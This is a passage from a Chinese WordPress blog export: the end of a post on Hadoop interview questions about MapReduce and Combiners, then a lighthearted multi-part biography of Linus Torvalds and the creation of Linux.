&nbsp;

<h1><strong>0x04 </strong><strong>面试的人给你出一些问题,让你用MapReduce来实现？</strong></h1>

比如:现在有10个文件夹,每个文件夹都有1000000个url.现在让你找出top1000000url。
&nbsp;
&nbsp;

<h1><strong>0x05 Hadoop中Combiner的作用?</strong></h1>

1、combiner最基本是实现本地key的聚合，对map输出的key排序，value进行迭代。如下所示：
map: (K1, V1) → list(K2, V2)
combine: (K2, list(V2)) → list(K2, V2)
reduce: (K2, list(V2)) → list(K3, V3)
2、combiner还具有类似本地的reduce功能.
例如hadoop自带的wordcount的例子和找出value的最大值的程序，combiner和reduce完全一致。如下所示：
map: (K1, V1) → list(K2, V2)
combine: (K2, list(V2)) → list(K3, V3)
reduce: (K3, list(V3)) → list(K4, V4)
3、如果不用combiner，那么，所有的结果都是reduce完成，效率会相对低下。使用combiner，先完成的map会在本地聚合，提升速度。
4、对于hadoop自带的wordcount的例子，value就是一个叠加的数字，所以map一结束就可以进行reduce的value叠加，而不必要等到所有的map结束再去进行reduce的value叠加。
combiner使用的合适，可以在满足业务的情况下提升job的速度，如果不合适，则将导致输出的结果不正确。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>354</wp:post_id>
		<wp:post_date><![CDATA[2015-11-23 19:43:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-11-23 11:43:44]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e4%bd%95%e4%b8%bahadoop%ef%bc%9f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="hadoop"><![CDATA[Hadoop]]></category>
		<category domain="post_tag" nicename="hadoop"><![CDATA[Hadoop]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[172]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Linus，一生只为寻找欢笑</title>
		<link>https://www.nervgeek.com/2015/11/30/linus%ef%bc%8c%e4%b8%80%e7%94%9f%e5%8f%aa%e4%b8%ba%e5%af%bb%e6%89%be%e6%ac%a2%e7%ac%91/</link>
		<pubDate>Mon, 30 Nov 2015 15:40:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=359</guid>
		<description></description>
		<content:encoded><![CDATA[<p class="text">每个人桌面上一台电脑，这曾经是无数计算机先驱的梦想，这个梦想很早就实现了，在1997年，乔老师和比老师就说过，「比尔，我们共同控制了100%的桌面系统市场」，当然乔老师没说的是，比老师控制了97%，乔老师还不到3%。时至今日，乔老师走了，比老师颓了，移动终端把传统的 PC 市场冲击的七零八落。普通用户都知道了Windows、Android、OS X 、iOS、BlackBerry等等，但是，他们依然不了解的是另一款在计算机发展史上起到了革命性作用的操作系统：Linux！</p>

<p class="text">当大家使用 Google 搜索时，使用 Kindle 阅读时，使用淘宝购物时，使用 QQ 聊天时，很多人并不知道，支撑这些软件和服务的，是后台成千上万台 Linux 服务器，它们时时刻刻都在进行着忙碌的运算和数据处理，确保数据信息在人、软件和硬件之间安全的流淌。可以这么说，世界上大部分软件和服务都运行在 Linux 操作系统之上，神马云计算、大数据、移动互联网，说起来风起云涌，其实没有 Linux 全得趴窝（微软除外）。</p>

<p class="text">但是，Linux 和它的缔造者 Linus Torvalds 一样低调，这么牛逼的一个物件，居然只有程序员知道它的传奇，这不科学！所以我准备在这个系列中写写Linus Torvalds：他是 Linux 和 Git 的缔造者，他是一个传统的黑客，与沃兹一样，少年成名，崇尚自由，一生只为寻找欢笑，他，是一个真正的程序员。</p>

<div class="quote">
注：为了防止大家把 Linux 和 Linus 搞混，我在后面的文章中统一采用 Linus 的中文译名：李纳斯。
&nbsp;
</div>

<!--more-->

<p class="text">李纳斯在2001年出过一本自传，叫做《Just for Fun》，是他和大卫·戴蒙合著的，当年我有幸读到这本书，了解了很多李纳斯的生平轶事，那时我就琢磨，这个天才已经达到人生的巅峰了吧，结果这位兄台并未停止前进的步伐，转手就在2005年搞出了分布式版本控制系统 Git，目前几乎全世界的程序员都在用 Git管理他们的代码，著名网站 Github 就是基于 Git 构建的。无论是 Linux 还是 Git，得一即可得天下，结果这哥们以一己之力发起了俩项目，而且都是主力开发人员。最终的结果是，成全了程序员，陶冶了用户，造福了一方百姓。正如李纳斯自己所言：「My name is Linus, and I am your God.」</p>

<p class="text"><strong>Linus（一）——生命的意义</strong></p>

<p class="text">1969年末，李纳斯出生于芬兰的赫尔辛基市，算是赶上了60后的尾巴。小时候他是个其貌不扬的孩子，除了一个鼻子长的「富丽堂皇」之外乏善可陈。他为了让鼻子看上去小一些，经常戴上眼镜就不愿意摘下来，这个策略和现在的很多大脸女生购买三星的 Galaxy Note 手机有异曲同工之妙。幼时的李纳斯不修边幅邋里邋遢，不怎么费劲数学和物理就学得极好，社交圈却一塌糊涂，他母亲经常和别人说，这孩子非常好养，只要把他放到一个有电脑的小黑屋里，然后再往里扔点薯条和意大利面，就行了。李纳斯对此表示认同。</p>

<p class="text">李纳斯把年幼的自己定位成 Nerd（书呆子），但是从他的自传里我却感受到了这位天才的有趣之处。他在书的前言里写到：</p>

<div class="quote">
我对生命的意义有种理论。我们可以在第一章里对读者解释生命的意义何在，这样就可以吸引住他们。一旦他们被吸引，并且付钱买了书，剩下的章节里我们就可以胡扯了。（注：做人要厚道啊）
</div>

<p class="text">关于生命的意义，李纳斯的解释是，有三件事具有生命的意义。它们是你生活当中所有事情的动机。第一是生存，第二是社会秩序，第三是娱乐。生活中所有的事情都是按这个顺序发展的，娱乐之后便一无所有。因此，从某种意义上来说，生活的意义就是要达到第三个阶段。你一旦达到了第三个阶段，就算成功了。但首先要越过前两个阶段。</p>

<p class="text">为什么李纳斯会这么说呢，我摘段原文给大家看看，非常有趣：</p>

<div class="quote">
李纳斯：我给你举个例子来说明这一观点。最明显的是性，它开始只是一种延续生命的手段，后来变成了一种社会性的行为，比如你要结婚才能得到性。再后来，它成了一种娱乐。大卫：性为什么是娱乐?李纳斯：好吧，我是在对牛弹琴。我举一个别的例子。大卫：别别，还是说说性吧李纳斯：它是在另一个层次上的blablabla……大卫(自言自语)：哦，参与就是娱乐，而不是在一旁观看。好，我明白了。
</div>

<p class="text">那生存、社会秩序和娱乐又是如何与技术扯上关系的呢？</p>

<p class="text"><strong>Linus（二）——天才也疯狂</strong></p>

<p class="text">李纳斯是这么解释的，技术的诞生同样是为了人类的生存，而且是为了让人生活的更好。汽车让人跑的更快，飞机让人飞得更高，互联网让人懂得更多，手机让人通信更快，一旦这些技术成了规模，就要并入社会秩序，然后下一个阶段就是娱乐，别看手机现在就是个打电话的工具，但是很快会进入娱乐阶段……（12年后的今天，手机已经彻头彻尾变成了一个娱乐工具，打电话反而成了附属功能）。</p>

<p class="text">李纳斯说：「一切事物都将从生存走向娱乐，但这并不意味着在某个局部地区没有倒退的现象，而且毫无疑问许多地方都有这种情况。有时事物的发展往往分裂的。」</p>

<p class="text">从这些内容我们可以看出，李纳斯有自己的一套理论，而且能自圆其说，其实每个人都有自己的理论，一件事做或者不做，都是自己说服自己，每一次进步，要么是推翻自己的理论，要么是完善自己的理论。李纳斯在很小的时候就建立了自己的理论领地，那就是数学、物理、逻辑，最后是计算机，所以他绝不是自己描述的 Nerd，而是一个大智若愚的牛娃，就像射雕里的郭靖一样，看着傻，其实比谁都精，脑子里装的都是十年二十年后的事儿。而且李纳斯比郭靖牛的地方是，就一个启蒙老师，还是自己的外公，和郭靖一比，高下立判！李纳斯基本上就是个自学成才的典范。</p>

<p class="text">李纳斯的外公是赫尔辛基大学的一位统计学教授，数学家。他有一台Commodore VIC-20计算机（Commodore 是与苹果公司同时期的个人电脑公司，曾经创造过一系列辉煌，1994年破产），这台电脑的主要功能就是没有功能，你唯一能做的事情就是用 Basic 语言在上面编写自己的程序，老爷子当年就是这么做的，比如做一些数学运算和公式计算等。但是老爷子年老眼花，也不愿意打字，于是就把自己的外孙李纳斯放在腿上，让他帮助录入写在纸片上的程序。这种很有场面感的场景一再出现后，李纳斯除了对数学有了初步的认识，同时也把计算机玩的娴熟，很快他就在外公的指导下开始编写自己的程序。</p>

<div class="quote">
评：很多大师级的人物，很小的时候就能在某个领域内头角峥嵘，展现出一些东西，然后经过长期的练习和创作，最终成为一代传奇。在这个过程里，环境是很重要的，逆境出人才基本上是个伪命题，这句话唯一的作用就是遇到困难时给自己打打鸡血。李纳斯就是个高知子弟，10岁人家就开始玩计算机了，我们10岁在干什么，打沙包么？甩方宝么？即使你在计算机方面有出众的天赋，但18岁以前连计算机的面儿都没见过，你就只能默默的牛逼了。等你真正开始展现出自己才华的时候，人家操作系统已经开发出来了，一入世就差别人十年的身位，除了冷冷的绝望，你还能感受到什么？
所以现在人们没事就北上广深杭，不是喜欢人多嘴杂空气差，而是在这些一线城市可以接触更多的人和事物，见更高的山，渡更宽的河。不是为了情怀，而是拥有格局。见都没见过，还同一个起跑线呢，一跑就得趴窝。所以，无论这些地方环境多恶劣，竞争多激烈，来的永远多过走的，不为别的，只是为了缓解些许绝望的感觉……
</div>

<p class="text">李纳斯用外公的计算机学会了 Basic 语言，并开始编写各种简单有趣的游戏，然后他又发现了 Basic 并不是计算机唯一能理解的语言，在它的下面，还有一种语言是由0和1组成，可以直接被计算机识别，于是李纳斯又开始用机器码编程，这次他可以控制更多计算机的细节，他与机器变得更加亲密。然后李纳斯就开始上中学了，中学的几年于他而言，其实没有太大变化，因为那些年他几乎都是坐在电脑前面度过的，在这个阶段，他熟练的掌握了汇编语言。</p>

<p class="text">终于有一天，李纳斯向编程世界挺进的步伐变得缓慢下来，因为他上大学了，原因之一是他必须集中精力读书，原因之二是找不到什么项目去做。还有一件事，李纳斯开始服兵役了，那段时光对他来说是如此特殊：</p>

<div class="quote">
在手执武器上了一个月的「体育课」之后，我便觉得在我有生之年完全有资格从此一动不动，享受平静的生活了。惟一可做的事情就是把编码打入键盘，或者手里端着一瓶比尔森啤酒！
</div>

<p class="text"><strong>Linus（三）——改变一生的书籍</strong></p>

<p class="text">终于，让李纳斯痛苦不堪的兵役终于结束了，除了敲锣打鼓欢庆重生之外，他开始继续拓展自己的编程之路，这时候，生命中最重要的一本书出现了，书的名字叫做《操作系统：设计和实现》，作者是 Andrew S. Tanenbaum。用李纳斯的原话表述就是「这本书把我推上了生命的高峰」。</p>

<p class="text">那个时代 Unix 已经开发出来了。最早 Unix 是用汇编写的，开发过程中 Unix 的两位创始人Ken Thompson 和 Dennis Ritchie觉得用汇编写程序实在是太苦逼了，男人应该对自己好一点！于是老哥俩决定用高级语言来完成下一个版本，他们首先尝试了Fortran，失败！然后又基于BCPL（Basic Combined Programming Lanugage）创建了 B 语言，B 语言可以被认为是那个时代的解释型语言，不能直接生成机器码，效率上完全没法满足系统的需求，再次失败！我们都知道，一再失败的情况下总会有一位英雄人物挺身而出，这次是 Dennis Ritchie，他从失败的大坑中爬起来拍拍土抹抹泪，继续对 B 语言进行改造。这次 Dennis 为 B 增加了数据类型，并让 B 语言能够直接编译为机器码，然后又为这门语言起了个极其响亮的名字：「New B」，读一读神清气爽，念一念气冲云霄，从此一代语言巨星冉冉升起，40年后依然排在兵器排名榜第一位，怎一个牛字了得！当然，Dennis可能考虑了十几年后中国人民的感受，把「New B」改为了 C 语言，并用 C 语言重新编写了 Unix 的内核，Unix 与 C 从此珠联璧合，长相思守，再也无法分离。</p>

<p class="text">操作系统、Unix 和 C 语言可以说是李纳斯心目中神山上的三座圣杯，为了至高无上的荣耀，他首先要攀上峰顶，把这三座圣杯捧在手中，然后再琢磨建造自己的宫殿的事儿。在那一年的夏天，李纳斯开始了高强度的阅读和学习，用他的话说就是做了两件事，「一件事是什么都没做，另一件事是读完了719页的《操作系统：设计和执行》。那本红色的简装本教科书差不多等于睡在了我的床上」。</p>

<p class="text">李纳斯认为，Unix 是一个简洁、干净的操作系统，在 Unix 上的大部分任务都是通过一些基本操作完成的，这些操作被成为「System Call」，顾名思义，这些操作就是你对系统的呼叫，系统通过响应你的呼叫完成工作。比如 fork、clone（创建子进程），比如 open、close、read、write（文件访问）。这些基本的系统调用通过组合可以完成大部分功能。同时，Unix 还提供了极为强大的IPC（进程间通信）方式：pipe（管道）。很多工作在GUI（图形界面）软件环境下的读者，最常用的IPC操作可能是复制、粘贴、鼠标拖拽，这些操作虽然简单，但是必须由人来完成，想要自动化就很困难。而这些在 Unix 上实现起来就像大自然一样自然，你只需要在程序之间开辟出一段缓冲区作为管道，然后父进程和子进程就可以通过这个管道实现进程间通信了。举个例子，以前给大家介绍的查找历史命令的脚本，就利用了管道的功能，如下：</p>

<p class="text">history | grep apache</p>

<p class="text">这行命令的含义就是查找包含 apache 的历史命令，其中特殊字符【 | 】用来告诉命令行解释器（Shell）将前一个命令的输出通过「管道」作为接下来的一行命令的输入，就这样，一个简单的进程间通信就完成了。</p>

<p class="text">总之，李纳斯在读完这本书之后，就像郭靖修习了九阴真经全本一样，对机器和代码的世界有了更为透彻的认知，接下来的事情就是等待一个打造传奇的机会。</p>

<p class="text">等待的过程中，李纳斯也没闲着，他又开始编程了。好的程序员对编程的喜爱是溢于言表的，以下摘录一些李纳斯的编程感想：</p>

<div class="quote">
对于喜爱编程的人来说，编程是世界上最有趣的事，比下棋有趣得多！因为你可以自己制订游戏规则，而你制定什么样的规则，也就会随之出现与此规则相符合的结果。
在电脑世界中，你就是创世者，你对所发生的一切拥有最终的控制。如果你功力深厚，你可以是上帝――在一个较小的层面上。
你可以建筑一个这样的房子，有一个活板门，既稳固又实用。但是每个人都可以看出一个仅仅以坚固实用为目的的树上小屋和一个巧妙地利用树本身特点的美妙小屋之间的差异。这是一个将艺术和工程融为一体的工作。编程与造树上小屋有相似之外……在编程中，实用的考虑往往被置于有意思、美观优雅或有震撼力的考虑之后。
</div>

<p class="text">在代码的世界里，李纳斯就是一个诗人！</p>

<p class="text"><strong>Linus（四）——Linux 诞生</strong></p>

<p class="text">Unix 始于上个世纪60年代，在70年代得到了迅猛的发展，这时候的李纳斯还躺在祖父公寓里的摇篮里睡大觉，如果不是后来 Unix 王国自乱阵脚，出现阵营分裂和法律纠纷，可能 Linux 系统根本都不会出现。真实的情况是，Unix 浪费了大把的时间和机会，似乎就是为了等待这个大鼻子、头发纷乱的芬兰小子长大，然后一决高下。李纳斯赢得了自己的时间，他一刻不停的磨练自己的技艺，在清晨的微光中练习算法，在赫尔辛基的雪山上编译代码，随时随地补充的粮草和武器。二十一年之后，李纳斯抚着雪亮的刀锋上路了，他要去追寻属于程序员的最高荣耀。</p>

<p class="text">1991年一月，李纳斯花费了三千五百美元，分期付款购买了一台杂牌组装电脑，内存4兆，CPU 33兆赫，还有一台14英寸的显示器，然后又买了 MINIX 操作系统，用十六张软盘把这个操作系统装到了计算机里。之后，李纳斯又用了一个月的时间，了解了 MINIX 的好和不好，并把这个系统改装成了自己得心应手的「战斗机」，开始了战斗的人生。就是在这台电脑上，催生了 Linux 的初始版本。</p>

<p class="text">Linux 的诞生离不开 MINIX，MINIX 是 Mini Unix 的缩写，是 Andy Tanenbaum 教授编写的迷你版的 Unix 操作系统，源代码可以提供给大学和学生，用于操作系统教学，采用了微内核设计。其中的代码还作为《操作系统：设计与实现》的示例程序，这本书我们在 Linus（三）中提到过，给了李纳斯极大的启发。</p>

<p class="text">李纳斯使用了 MINIX 之后，发现这个系统有很多缺陷，比如性能问题、内核问题、文件系统问题，最大的问题是终端仿真器，也就是我之前总提到的 Terminal，登录学校里的 Unix Server 和上网时，李纳斯都需要终端，但是 MINIX 无法满足这个需求。如果普通人遇到这种问题，估计就是发会呆然后洗洗睡了，或者说「你行你上啊」，李纳斯不是普通人！</p>

<p class="text">他决定抛开 MINIX，从硬件层面开始，重新设计一个终端仿真器。牛人就是不同凡响，这个决定表明了李纳斯需要从 BIOS、CPU等硬件层面重新开发出一套系统，除此之外，还需要了解如何把信息写入显示器，如何读取键盘输入，如何读写调制解调器，早期储备的汇编语言和 C 语言能力终于派上了用场……</p>

<p class="text">两个月之后，终端仿真器完成，对此李纳斯非常骄傲：</p>

<div class="quote">
对于我了不起的成就，萨拉（妹妹）是了解的。我把终端显示给她看，她盯着显示器看了大约五秒钟，看着上面是一串A和一串B，说了声「很好」，然后就没有然后了。我意识到我的成就并不辉煌，这犹如你指给人看你铺设的一条长长的柏油马路，但想向别人解释这条马路的意义是完全不可能的。
当时是三月，也可能是四月，就算彼得盖坦街上的白雪已经化成了雪泥我也不知道，当然我也并不关心。大部分时间我都穿着睡衣趴在相貌平平的计算机前面噼噼啪啪的敲打键盘，窗户上的窗帘遮得严严实实，把阳光和外部世界与我隔离开来。
</div>

<p class="text">Linux 操作系统就这样开始了，一发不可收拾。李纳斯的当时编程状态是这样的：编程――睡觉――编程――睡觉――编程――吃饭――编程――睡觉――编程――洗澡――编程……</p>

<p class="text">实现了终端仿真器之后，李纳斯马不停蹄，开始添加磁盘驱动和文件系统，那一年李纳斯还在上课，但是课程很简单，他唯一的课外活动就是参加每周三晚的同学聚会，这个长着大鼻子的技术天才，常常会因为担心自己缺乏社交能力和容貌丑陋而失眠，对那时的他来说，唯一有趣的事情就是把驱动程序写出来。于是他咬咬牙对自己说，还得干下去。（看来没有女神的好处就是可以写个操作系统出来，然后把自己叫做 上帝）。</p>

<p class="text">随着工作的进展，终端仿真器正在开始向一个操作系统的方向发展，李纳斯显然也看清楚了这一点。</p>

<p class="text">在整个创造 Linux 的过程中，我们没有看到李纳斯使用了什么样高级工具，估计那时也没有，整个系统基本上是一行行代码敲出来的，纯手工打造，这些先贤的编程功底和效率让我们叹为观止，所以，现在，我决定打开终端，输入 vi，然后键入：to be continued，感受一下李纳斯当年编程的风采……</p>

<p class="text">随着李纳斯不断的敲击键盘，他的终端仿真程序也不停的扩张，从刚开始的小树苗长成了一株盘根错节的大树，树根牢牢的抓住土地，枝丫努力的伸向天空，花朵和果实开始在高远的天空中烁烁发光，所有的细节都在李纳斯的掌控之中。懂行的技术人员都看得出来，这个大鼻子的芬兰小子是准备开发一个操作系统啊。</p>

<p class="text">是年6月份，李纳斯基本确定了要开发一个操作系统内核的计划，并开始着手搜集 Unix 操作系统标准的相关资料。1991年7月3日，格林威治时间上午10点钟，李纳斯在 MINIX 新闻组发出了一封求助邮件，寻求有关 Posix 标准的帮助，他在邮件中写道：</p>

<div class="quote">
目前我正在 MINIX 系统下做一个项目，对 POSIX 标准很感兴趣。有谁能向我提供一个机器可读的最新的 POSIX 规则？如果能有个 FTP 地址就更好了。
</div>

<p class="text">这份公开的邮件是标识 Linux 问世的最早证据。邮件发出后不久，有人就寄来了厚厚的 POSIX 标准，同时赫尔辛基工学院的 Ari Lemke 也对李纳斯的邮件做出了响应，为李纳斯提供了一个 FTP 地址，用来上传他即将完成的操作系统。</p>

<div class="quote">
注：POSIX 全称是可移植操作系统接口（Portable Operating System Interface）。IEEE 最初制定 POSIX 标准，是为了提高 UNIX 环境下应用程序的可移植性。随着技术的发展，POSIX 开始不局限于 UNIX 系统，后续的 Linux 和 Windows NT 都部分的遵循了该标准。POSIX 在李纳斯开发的过程中起到了灯塔的作用，直接后果就是 Linux 系统从一开始就走在了正规军的康庄大道上，基本没有跑偏过。Linux 几乎可以适配各种类型的硬件体系结构。
</div>

<p class="text">标准和 FTP 地址都有了眉目，李纳斯开始实现各种 System Call，以便让 Shell 运行起来。这段时间的工作让李纳斯时常感到灰心丧气，看着增加的代码量，工作似乎前进了一大步，但是检验一下功能又仿佛没有任何进展。有时候他还不得不放弃之前的想法和已经完成的代码实现，另辟蹊径重头再来，即使是在天才面前，代码也能让人欢喜让人忧。</p>

<p class="text">终于 Shell 已经可以在新的操作系统上工作了，李纳斯开始编写拷贝（cp）和列表（ls）等程序。Shell 程序一旦完成，就好像完成了从0到1的飞跃，一切都变得无比顺利，李纳斯面前仿佛出现了一条阳关大道，一切都豁然开朗了，他说，要有光，于是就有了光。对于这种状态，李纳斯表示：「我很满意」，并且开始用「Linux」称呼这个操作系统。</p>

<p class="text">这种满意非常重要，因为那个夏天李纳斯除了伏在电脑面前噼噼啪啪的敲击键盘，什么都没做。芬兰四月到八月的日子是一年中最美好的时光。人们到布满小岛的海上航行，去海滩上晒日光浴，到夏日小木屋中消遣时光。但是李纳斯，他只是在永无休止的编写程序，忘记了白天和黑夜，黑色的窗帘遮蔽了灿烂的阳光，也遮蔽了外面的世界。他唯一的想法就是，得赶紧把这该死的系统做出来！</p>

<p class="text">1991年8月25日，李纳斯在MINIX 新闻组上发邮件做了一个调查，想知道大家希望这个新的操作系统具备什么特征。</p>

<p class="text">1991年9月17日，李纳斯把已经完成的新操作系统上传到了Ari Lemke提供的 FTP 服务器上，并准备用「Freax」作为操作系统的最终代号，结果遭到了Ari Lemke的激烈反对。Ari Lemke对李纳斯说：</p>

<p class="text">「李哥，您咋会想到用这么变态的名字命名操作系统呢？原来的Linux不挺好的嘛」「那样不会显得自恋么？」「您这样就不对了，操作系统是开天辟地的大事，人民群众都等着用您的名字命名呢，看看他们的眼神，您能辜负他们的期望吗？Linux 天生不就是用来了 Unix 遥相呼应的么？这是命，得认！」「这……那我就不推辞了啊」</p>

<p class="text">以上为意译，不过基本上和古代皇帝的黄袍加身是一个意思。新的操作系统最终以「Linux」命名，并在10年后名扬天下，20年后统治服务器领域，可谓 Linux 恒久远，Linus 永流传。</p>

<p class="text">Linux 内核0.01版本终于发布了，虽然漫长的开发过程才刚刚开始，但李纳斯终于可以松口气了：</p>

<div class="quote">
瞧，我真的做出了点什么。我没有在骗你们。这就是我所做的……
</div>

<p class="text">创造操作系统，就是去创造一个所有应用程序赖以生存的基础环境――从根本上来说，就是在制定规则：什么可以接受，什么可以做，什么不可以做。事实上，所有的程序都是在制定规则，只不过操作系统是在制定最根本的规则。——李纳斯</p>

<p class="text"><strong>Linus（五）——继续前行</strong></p>

<p class="text">Linux 从一诞生就被打上了开源的烙印，这一点对 Linux 的后续发展起到了至关重要的作用。从1991年内核0.01版本发布，到1994年1.0版本闪亮登场，世界各地无数的开发者为 Linux 提交了代码，李纳斯为 Linux 建立了讨论组 comp.os.linux，全世界爱好开源和 Linux 的程序员与黑客都在上面讨论问题，他们就像群蜂筑巢一样，不断的通过个体和群体的力量交替推进 Linux 的飞速发展。</p>

<p class="text">李纳斯对自己说：嗯，没有任何东西可以阻挡 Linux 的普及！</p>

<p class="text">这种感觉估计很多程序员都体会过，当你设计的算法得出了正确结果的时候，当你自以为解决了一个海森堡 bug（Heisenbug，表示不可重现）的时候，当你完成了一段精妙代码的时候，你摘下厚重的眼镜，推开铺满灰尘的书桌，打开办公室唯一的窗户，迎着夕阳把一只废弃的圆珠笔扔出窗外，然后冲着天空大喊：还有谁~~~？这是一种拔剑四顾心茫然的情怀。</p>

<p class="text">李纳斯还不止于此。他不仅单枪匹马写出了 Linux 的内核，而且做出了开源的决定。他把 Linux 放到了互联网上，并且允许那些希望使用和改进它的人们根据开源协议修改和提交源代码。这两点对互联网的影响是极其深远的，估计李纳斯当年也没有想到，当时的两个小小的涟漪，经过时间和空间的放大，十几年后形成了一股互联网巨浪，到现在 Linux 依然处于风口浪尖。</p>

<p class="text">对于 Linux 取得的成功，李纳斯将其归结为是由自己的缺点导致的：</p>

<div class="quote">
1、 我很懒散2、 我喜欢授权给其他人
</div>

<p class="text">其实这两个所谓的缺点，正是优秀程序员和领导者必备的要素，它们让 Linux 成为世界上最大的开源协作项目，为喜爱 Linux 的人们带来了最美好的技术和应用，现代的互联网几乎是运行在 Linux 之上的，可以说，李纳斯改变了世界，你每一次伐开心后在淘宝上买包包，都有李纳斯贡献的力量！</p>

<p class="text"><strong>Linus（六）——来到硅谷</strong></p>

<p class="text">1996年的春天，Linux 顺利发布了2.0版本。是年李纳斯27岁，这个芬兰小子已经慢慢厌倦了芬兰平淡无奇的日子和不眠不休的编程生活。对于一个技术天才来说，创造一套新的技术体系就像艺术家完成一个雕像一样，当一块粗砺的岩石在他的亲手打磨下逐渐显山露水，展现出其完美容颜的时候，后续的修修补补会让这些天才产生倦怠的感觉。他们需要更快的剑，更高的山和更强大的对手。尤其是期间李纳斯访问过两次美国之后，这种感觉变得愈发不可阻挡了。</p>

<p class="text">说起来美国确实是个神奇的国度，这样一个移民国家中，居住了各种从不同国度不远万里跨海而来的种族，每个种族无论在基因上还是文化上都具有原来国家的特质，这些特质相互融合与对抗，让这块大陆上的人民更锐意进取，更开放，更自由，他们愿意去追求和接纳美好的事物，最终一不留神把美国搞成了世界文化的大熔炉，而开放的文化和环境又极大的激发了人们的想象力和创造力，近代和现代的科技成果几乎全部源于美国，要么是美国人搞的，要么是外国人在美国搞的。所以有时候我们也不用顾影自怜，嘲笑自己没有国产的操作系统和编程语言，因为其他国家也没有，或很少有，芬兰好不容易出了个天才少年，也没好好珍惜，最终落了个「流落」异国他乡的下场。</p>

<p class="text">李纳斯一到美国就被这块新大陆吸引了，一切都是那么的新鲜和美好，他的感受与你第一次出国后在微信朋友圈发的「天是那么的蓝，云是那么的白」是一样一样的。李纳斯在自传中写道：</p>

<div class="quote">
我所参观的摩门教堂已有一百五十年的历史，却被照顾的很好，清洗后的教堂显示出亮丽的白色。要是在欧洲，所有的教堂都显得老旧不堪，像是蒙上了一层岁月的斑痕。看着这洁白亮丽的教堂，我脑海里产生的唯一联想竟然是迪斯尼乐园。因为它看起来太像是童话故事中的城堡，而不太是一个教堂了。
我记得自己徒步走过了金门大桥。在桥的这头时，我望着对岸的马林海岬，恨不得立刻就到对岸去徜徉在那美丽的群山之间。但等我真走到那边时，我几乎不愿意再挪动双腿……那时的我绝对想不到，在时隔六年以后的今天，我会坐在海风吹拂的海岬峰顶，一面俯瞰太平洋、旧金山湾、金门大桥和笼罩在雾中的旧金山城，一面对着大卫的录音机讲述着这一切。
</div>

<p class="text">从美国回到芬兰之后，李纳斯对自己说，我要去美国。</p>

<p class="text">当李纳斯透露出自己的就业计划之后，马上有多家公司递来橄榄枝，其中包括著名的 Linux 公司 Red Hat。这种感觉是如此美妙，就像你刚刚掏出一支香烟，面前已是千百个打火机舞动。但是李纳斯本着不加入任何一家 Linux 公司的原则，拒绝了 Red Hat，参加了另一个名不见经传的公司的面试，这家公司叫做 Transmeta，中译名「全美达」，你们可以从维基百科上查到这家公司，不过我打赌，知道这家公司的读者不会超过千分之一，这并不是咱们孤陋寡闻，因为美国人民刚开始也不知道这家公司在干嘛，全美达官网在1997年中上线，两年半后网站的建设情况是「This web page is not yet here」，又过了很久人们才从内部员工透露出的一点信息得知，这家公司似乎是搞处理器的。这是我所知道的唯一一家保密措施强过苹果的公司，如果不是李纳斯，这家公司就像是根本没有存在过。</p>

<p class="text">就是这样一家公司，面试了在开源社区名满天下的技术天才、Linux 操作系统的缔造者李纳斯，并且将其招至麾下，一待就是六年。从某种程度上，这六年严重的影响了 Linux 操作系统前行的脚步，因为李纳斯没有足够的时间开发 Linux 了。</p>

<p class="text">虽然根据 Transmeta 与李纳斯的协议，他可以继续从事 Linux 的开发，而且他确实也想这么做，比如白天为 Transmeta 工作，编写 X86 解释程序，晚上继续 Linux 的伟大事业。不过真实的情况是，晚上丫睡着了……</p>

<p class="text">关于加班和睡眠，李纳斯是这么解释的：</p>

<div class="quote">
很多人都认为加班加点的工作才算真正的工作。我可不这么想。无论是 Transmeta 的工作还是 Linux 的工作，都不是靠牺牲宝贵的睡眠时间换来的。事实上，如果你想听真话，我要说，我更喜欢睡觉。
</div>

<p class="text">总之，李纳斯第一次从互联网上消失了，很多悲观的开发者纷纷奔走相告，李纳斯这小子是不是被招安了？丫开始为商业公司干活了，Linux 作为自由软件是不是已经濒临死亡了？每当这时候李纳斯就会出来给大家打打气说，哥还在呢，只不过刚睡醒……</p>

<p class="text">关于李纳斯的这段经历，曾经在硅谷工作过的一位朋友给我提供了如下文字，大意是这样的：</p>

<div class="quote">
每次想起李纳斯这段经历，我都要感慨万千。第一次得知李纳斯虎落硅谷的事是在2002年夏天，当地的水星报记者先是把李纳斯大吹一通，然后说他从芬兰老家搬到美国，就职于 Transmeta 已五年有余，但 H1 移民仍然停留在劳工卡初级阶段，六年期满就要打道回府了。
